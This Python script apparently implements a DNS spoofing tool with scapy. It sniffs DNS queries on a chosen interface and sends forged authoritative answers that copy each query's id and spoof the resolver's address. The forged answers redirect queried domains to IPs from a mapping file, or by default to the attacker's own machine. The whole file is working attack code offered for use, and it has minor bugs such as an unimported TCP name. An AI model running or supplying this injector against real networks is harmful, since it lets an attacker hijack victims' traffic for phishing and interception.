import argparse
from scapy.all import sniff, IP, UDP, DNS, DNSQR, DNSRR, send, get_if_list
import netifaces
import socket

# Parse arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="DNS Packet Injector")
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('-i', '--interface', default=None, help="Network interface to capture packets")
    parser.add_argument('-f', '--filter', default='', help="Optional BPF filter for sniffing")
    parser.add_argument('-h', '--hostnamefile', help="File with hostname-IP mappings for injection")
    return parser.parse_args()

# Retrieving default network interface
def get_default_interface():
    gateways = netifaces.gateways()
    return gateways['default'][netifaces.AF_INET][1] if 'default' in gateways else None

#helper function to load hostname and corresponding ips
def load_hostnames(file_path):
    hostnames = {}
    if file_path:
        with open(file_path, 'r') as f:
            for line in f:
                ip, hostname = line.strip().split(',')
                hostnames[hostname] = ip
    return hostnames

# Get local IP address for default answer
def get_local_ip():
    return socket.gethostbyname(socket.gethostname())

#function to inject the packets
def forge_and_send_response(request_packet, response_ip):
    forged_response = (
        IP(src=request_packet[IP].dst, dst=request_packet[IP].src) /
        UDP(sport=request_packet[UDP].dport, dport=request_packet[UDP].sport) /
        DNS(
            id=request_packet[DNS].id,
            qr=1, aa=1, qd=request_packet[DNS].qd,
            an=DNSRR(rrname=request_packet[DNSQR].qname, ttl=300, rdata=response_ip)
        )
    )
    send(forged_response, verbose=False)
    
    #Printing sent packet details
    print(f'Sent 1 packets.')
    print(f'IP / UDP / DNS Ans "{response_ip}"')
    print('.')


def dns_sniff(packet):
    # Check if the packet has the required layers: IP, UDP/TCP, and DNS
    if packet.haslayer(IP) and (packet.haslayer(UDP) or packet.haslayer(TCP)) and packet.haslayer(DNS):
        if packet[DNS].opcode == 0 and packet[DNS].ancount == 0:  # Check if it is a DNS query
            queried_domain = packet[DNSQR].qname.decode().strip('.')
            print(f"Captured DNS query for domain: {queried_domain}")
            
            # Determinng IP to inject
            response_ip = hostnames.get(queried_domain, get_local_ip())
            print(f"Captured DNS query for domain: {queried_domain}, forging response with IP {response_ip}")
            forge_and_send_response(packet, response_ip)

# Main 
if __name__ == "__main__":
    args = parse_arguments()
    interface = args.interface or get_default_interface()
    bpf_filter = args.filter or 'udp port 53'  # Default to DNS filter on UDP if none provided
    hostnames = load_hostnames(args.hostnamefile)

    print("Available interfaces:", get_if_list())

    print(f"Starting DNS injector on interface: {interface} with BPF filter: '{bpf_filter}'")
    sniff(iface=interface, filter=bpf_filter, prn=dns_sniff, store=0)
